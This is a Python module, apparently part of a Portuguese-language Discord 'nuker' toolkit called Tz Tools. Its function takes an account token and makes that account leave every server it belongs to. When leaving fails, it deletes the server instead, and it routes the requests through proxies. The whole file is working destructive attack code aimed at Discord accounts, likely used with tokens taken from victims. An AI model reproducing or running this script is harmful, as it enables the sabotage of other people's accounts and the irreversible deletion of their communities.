# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).
import requests

from colorama import Fore

from util.plugins.common import getheaders, proxy

def Leaver(token, guilds):
    for guild in guilds:
        response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
        if response.status_code == 204 or response.status_code == 200:
            #Sair dos servidores em que o usuário está
            print(f"{Fore.YELLOW}Guilda esquerda: {Fore.WHITE}"+guild['name']+Fore.RESET)
        elif response.status_code == 400:
            #Delete os servidores que o usuário possui
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            print(f'{Fore.RED}Servidor excluído: {Fore.WHITE}'+guild['name']+Fore.RESET)
        else:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {response.status_code}")
            pass